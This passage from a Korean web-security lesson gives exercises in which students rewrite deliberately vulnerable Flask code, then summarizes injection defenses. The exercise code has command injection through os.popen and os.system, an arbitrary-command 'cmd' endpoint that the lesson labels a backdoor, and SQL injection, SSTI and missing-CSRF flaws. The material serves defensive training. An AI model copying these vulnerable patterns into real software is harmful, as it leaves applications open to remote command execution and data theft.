# 4. SameSite 쿠키 설정
# 5. 모든 폼과 AJAX 호출에 토큰 추가
```

### 연습 문제 4: Command Injection 방지

이 파일 관리 API를 인젝션 안전하게 다시 작성하세요:

```python
"""
연습 문제: 모든 엔드포인트를 command injection 방지하도록 다시 작성.
가능한 경우 셸 명령 대신 Python 라이브러리 사용.
"""
import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/files/list')
def list_files():
    path = request.args.get('path', '.')
    output = os.popen(f'ls -la {path}').read()
    return jsonify({"files": output})

@app.route('/api/files/search')
def search_files():
    pattern = request.args.get('pattern', '*')
    path = request.args.get('path', '.')
    output = os.popen(f'find {path} -name "{pattern}"').read()
    return jsonify({"results": output})

@app.route('/api/files/compress', methods=['POST'])
def compress():
    files = request.json.get('files', [])
    output_name = request.json.get('output', 'archive.tar.gz')
    file_list = ' '.join(files)
    os.system(f'tar czf {output_name} {file_list}')
    return jsonify({"status": "compressed"})

@app.route('/api/system/info')
def system_info():
    command = request.args.get('cmd', 'uname -a')
    output = os.popen(command).read()
    return jsonify({"output": output})

# 요구사항:
# 1. 셸 명령을 Python 등가물로 대체
# 2. 모든 매개변수에 대한 입력 검증 추가
# 3. 경로 탐색 공격 방지
# 4. system_info 엔드포인트를 완전히 제거 (백도어!)
```

### 연습 문제 5: 전체 애플리케이션 보안 검토

이 애플리케이션에 대한 보안 검토를 수행하고 모든 인젝션 취약점을 수정하세요:

```python
"""
연습 문제: 이 애플리케이션에는 이 레슨에서 다룬 각 인젝션 유형의 취약점이
최소 하나씩 있습니다:
- SQL Injection
- XSS (Reflected 및 Stored)
- CSRF
- Command Injection
- SSTI

모두 찾아서 수정하세요. CSP 헤더를 포함한 심층 방어 조치 추가.
"""

from flask import Flask, request, render_template_string, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'dev-key'

@app.route('/search')
def search():
    q = request.args.get('q', '')
    db = sqlite3.connect('app.db')
    results = db.execute(
        f"SELECT * FROM articles WHERE title LIKE '%{q}%'"
    ).fetchall()
    return render_template_string(
        f"<h1>Results for: {q}</h1>" +
        "<ul>{% for r in results %}<li>{{ r[1] }}</li>{% endfor %}</ul>",
        results=results
    )

@app.route('/comment', methods=['POST'])
def add_comment():
    text = request.form['text']
    db = sqlite3.connect('app.db')
    db.execute(f"INSERT INTO comments (text) VALUES ('{text}')")
    db.commit()
    return "Comment added"

@app.route('/preview')
def preview():
    template = request.args.get('template', '<p>Hello</p>')
    return render_template_string(template)

@app.route('/export')
def export():
    filename = request.args.get('file', 'data.csv')
    os.system(f'cp uploads/{filename} /tmp/export_{filename}')
    return "Exported"

@app.route('/profile', methods=['POST'])
def update_profile():
    # CSRF 토큰 확인 없음
    bio = request.form['bio']
    db = sqlite3.connect('app.db')
    db.execute(f"UPDATE users SET bio = '{bio}' WHERE id = {session['user_id']}")
    db.commit()
    return "Updated"
```

---

## 11. 요약

```
┌─────────────────────────────────────────────────────────────────┐
│          인젝션 공격 및 방어 요약                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SQL Injection:                                                  │
│  - 근본 원인: 쿼리의 문자열 연결                                 │
│  - 수정: 매개변수화된 쿼리, ORM                                  │
│  - 기억: 자체 데이터베이스의 데이터도 매개변수화 필요             │
│                                                                  │
│  XSS (Cross-Site Scripting):                                    │
│  - 근본 원인: 인코딩 없이 HTML로 렌더링된 사용자 입력            │
│  - 수정: 컨텍스트별 출력 인코딩 + CSP                            │
│  - DOM 조작에 innerHTML이 아닌 textContent 사용                  │
│  - Jinja2 자동 이스케이프 + 사용자 입력과 |safe 절대 사용 금지  │
│                                                                  │
│  CSRF:                                                           │
│  - 근본 원인: 요청이 우리 사이트에서 왔는지 확인 없음             │
│  - 수정: CSRF 토큰 + SameSite 쿠키 + Origin 확인                │
│  - 모든 상태 변경 엔드포인트에 방어 필요                         │
│                                                                  │
│  Command Injection:                                              │
│  - 근본 원인: 셸 명령의 사용자 입력                              │
│  - 수정: Python 라이브러리 (셸 피함), 리스트로 subprocess        │
│  - 사용자 입력과 shell=True 절대 사용하지 않기                   │
│                                                                  │
│  LDAP Injection:                                                 │
│  - 근본 원인: LDAP 필터의 문자열 연결                            │
│  - 수정: 특수 문자 이스케이프, 인증에 LDAP bind 사용             │
│                                                                  │
│  SSTI:                                                           │
│  - 근본 원인: 템플릿 데이터가 아닌 템플릿의 사용자 입력          │
│  - 수정: 사용자 입력을 템플릿이 아닌 템플릿 변수로 전달          │
│  - render_template_string(f"...{user_input}...") 절대 사용 금지 │
│                                                                  │
│  심층 방어:                                                      │
│  입력 검증 → 매개변수화 → 출력 인코딩 → CSP                     │
│  네 가지 계층 모두. 예외 없음.                                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

**이전**: [07. OWASP Top 10 (2021)](07_OWASP_Top10.md) | **다음**: [09. 웹 보안 헤더와 CSP](./09_Web_Security_Headers.md)
